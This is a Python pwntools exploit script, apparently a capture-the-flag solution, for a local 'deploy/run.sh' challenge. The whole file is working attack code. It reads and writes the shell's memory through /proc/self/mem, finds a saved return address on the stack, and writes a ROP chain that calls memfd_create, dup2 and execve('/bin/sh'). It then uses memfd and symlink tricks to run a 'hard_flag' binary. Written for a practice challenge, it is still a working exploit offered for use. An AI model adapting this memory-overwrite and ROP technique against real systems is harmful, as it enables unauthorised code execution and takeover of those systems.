#!/usr/bin/env python3

from pwn import *

p = process('deploy/run.sh')

p.sendlineafter(b'Enter your choice: ', b'2')
p.recvuntil(b'/ $ ')

def sys(cmd):
    p.sendline(cmd.encode())
    res = p.recvuntil(b'/ $ ')
    return res.split(b'\n', 1)[1][:-4]

def stack_top():
    res = sys('cat /proc/$$/maps | grep stack')
    addr = res.split()[0].split(b'-')[1]
    return int(addr.decode(), 16)

def open_mem():
    sys('exec 3<>/proc/self/mem')

def read_mem(sz, off=0):
    if off < 0:
        off += 2**64
    res = sys(f'dd bs=1 count={sz} skip={off} <&3')
    return res[:sz]

def seek_mem(off):
    read_mem(0, off)

def write_mem(val, off=0):
    if off < 0:
        off += 2**64
    p.sendline(f'dd bs=1 count={len(val)} seek={off} >&3'.encode())
    p.sendline(val)

open_mem()

BLK_SZ = 4096

ok = False
addr = stack_top()

seek_mem(addr + BLK_SZ)
for _ in range(16):
    data = read_mem(BLK_SZ, -BLK_SZ * 2)
    addr -= BLK_SZ

    # wait4()'s ret addr
    pos = data.find(p64(0x4c7cce))
    if pos > 0:
        # FIXME: Why do we have to do this?
        pos -= pos & 7

        seek_mem(-BLK_SZ + pos)
        addr += pos

        ok = True
        break

assert ok

def set_rdi(rdi):
    #  4d566d:       5f                      pop    %rdi
    #  4d566e:       c3                      ret
    return p64(0x4d566d) + p64(rdi)

def set_rsi(rsi):
    #  4d8b82:       5e                      pop    %rsi
    #  4d8b83:       c3                      ret
    return p64(0x4d8b82) + p64(rsi)

def set_rdx(rdx):
    #  4d5e2f:       5a                      pop    %rdx
    #  4d5e30:       c3                      ret
    return p64(0x4d5e2f) + p64(rdx)

def set_rax(rax):
    #  4d985c:       58                      pop    %rax
    #  4d985d:       c3                      ret
    return p64(0x4d985c) + p64(rax)

def syscall0(nr):
    #  4d8765:       0f 05                   syscall
    #  4d8767:       c3                      ret
    return set_rax(nr) + p64(0x4d8765)

def syscall1(nr, arg0):
    return set_rdi(arg0) + syscall0(nr)

def syscall2(nr, arg0, arg1):
    return set_rsi(arg1) + syscall1(nr, arg0)

def syscall3(nr, arg0, arg1, arg2):
    return set_rdx(arg2) + syscall2(nr, arg0, arg1)

def sys_get_flag(idx, buf):
    return syscall2(548, idx, buf)

def sys_write(fd, buf, sz):
    return syscall3(1, fd, buf, sz)

def sys_exit_group(code):
    return syscall1(231, code)

def sys_memfd_create(name, flags):
    return syscall2(319, name, flags)

def sys_dup2(oldfd, newfd):
    return syscall2(33, oldfd, newfd)

def sys_execve(filename, argv, envp):
    return syscall3(59, filename, argv, envp)

OFF_ARGV = 0x160
OFF_ENVP = 0x168
OFF_BINSH = 0x170

payload = sys_memfd_create(0x400000, 0) * 4
payload += sys_dup2(2, 1)
payload += sys_execve(
            addr + OFF_BINSH, \
            addr + OFF_ARGV, \
            addr + OFF_ENVP)

assert len(payload) <= OFF_ARGV
payload = payload.ljust(OFF_ARGV)
payload += p64(addr + OFF_BINSH)

assert len(payload) == OFF_ENVP
payload += p64(0)

assert len(payload) == OFF_BINSH
payload += b'/bin/sh\x00'

write_mem(payload)
p.recvuntil(b'/ $ ')
p.recvuntil(b'/ $ ')

fd = 4
for file in {'libgcc_s.so.1', \
        'libc.so.6', \
        'ld-linux-x86-64.so.2', \
        'hard_flag'}:
    sys(f'cat /tmp/{file} >> /proc/$$/fd/{fd}')
    sys(f'ln -s /proc/$$/fd/{fd} /home/guest/{file}')
    fd += 1

cmd = f'LD_LIBRARY_PATH=/home/guest ' + \
        '/home/guest/ld-linux-x86-64.so.2 ' + \
        '/home/guest/hard_flag'
print(sys(cmd))
